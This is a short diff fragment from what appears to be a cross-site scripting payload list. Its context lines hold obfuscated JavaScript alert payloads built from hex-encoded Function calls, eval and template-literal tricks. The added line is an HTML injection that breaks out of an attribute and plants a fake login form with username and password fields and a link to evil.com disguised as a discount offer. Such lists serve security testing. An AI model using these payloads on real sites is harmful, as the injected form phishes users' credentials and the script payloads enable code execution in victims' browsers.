@@ -86,3 +86,6 @@ Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
  /* </script> &#x3c;img/src/ <script>window[/al/.source+/ert/.source](origin);</script> /> */
 
 a=eval,c=["a"],x=["lert"],t=\${c}${x}(origin)`,http://a.call`1${t}``
+
+
+"><u><b><a/href="https://evil.com">click%20here%20for%20exclusive%20discount</a></b></u><br><input%20placeholder="enter%20username"><input%20placeholder="enter%20password"><input%20type="submit"%20value="login
